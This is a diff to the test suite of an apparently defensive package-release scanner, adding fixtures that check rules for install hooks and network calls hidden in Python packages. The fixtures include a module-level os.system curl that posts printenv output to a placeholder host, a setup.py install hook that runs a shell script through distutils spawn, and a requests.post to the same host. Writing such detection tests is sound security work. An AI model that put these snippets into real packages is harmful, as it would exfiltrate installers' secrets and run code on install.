@@ -61,6 +61,14 @@ THREAD_PAYLOAD = (
 )
 # The ultralytics 8.3.45 shape: os.system straight at module level.
 TOP_LEVEL_PAYLOAD = "import os\n\nos.system('curl -d \"$(printenv)\" https://example.invalid/x')\n"
+# A cmdclass install hook that runs a command through distutils, not subprocess.
+SETUP_SPAWN = (
+    "from distutils.spawn import spawn\nfrom setuptools import setup\n"
+    "from setuptools.command.install import install\n\n"
+    "class PostInstall(install):\n    def run(self):\n        install.run(self)\n"
+    "        spawn(['sh', 'demo/_post.sh'])\n\n"
+    "setup(name='demo', cmdclass={'install': PostInstall})\n"
+)
 
 
 @dataclass(frozen=True)
@@ -432,6 +440,13 @@ def _rows() -> list[Row]:
         _sdist("1.1", {**SRC, "pyproject.toml": BACKEND.format("hatchling.build")}),
         eco=PYPI,
     )
+    fires(
+        "GRN-C002",
+        "setup.py install hook runs a command through distutils spawn",
+        _sdist("1.0", SRC),
+        _sdist("1.1", {**SRC, "setup.py": SETUP_SPAWN}),
+        eco=PYPI,
+    )
     quiet("GRN-C002", "setup.py unchanged", _sdist("1.0", SRC), _sdist("1.1", SRC), eco=PYPI)
     quiet(
         "GRN-C002",
@@ -488,6 +503,38 @@ def _rows() -> list[Row]:
                 **PKG,
                 "demo/_net.py": "import socket\n\nsocket.create_connection(('example.invalid', 443))\n",
             },
+        ),
+    )
+    fires(
+        "GRN-C003",
+        "an empty os.py beside the package doesn't hide os.system",
+        release("1.0", PKG),
+        release("1.1", {"demo/__init__.py": INIT + TOP_LEVEL_PAYLOAD, "os.py": ""}),
+    )
+    fires(
+        "GRN-C003",
+        "an empty requests.py beside the package doesn't hide requests.post",
+        release("1.0", PKG),
+        release(
+            "1.1",
+            {
+                "demo/__init__.py": INIT
+                + "import requests\n\nrequests.post('https://example.invalid', data='')\n",
+                "requests.py": "",
+            },
+        ),
+    )
+    quiet(
+        "GRN-C003",
+        "a package named like a library in the set calls its own module",
+        release("1.0", {"requests/__init__.py": INIT, "requests/api.py": INIT}, package="requests"),
+        release(
+            "1.1",
+            {
+                "requests/__init__.py": INIT + "from requests import api\n\napi.hello()\n",
+                "requests/api.py": INIT,
+            },
+            package="requests",
         ),
     )
     quiet(
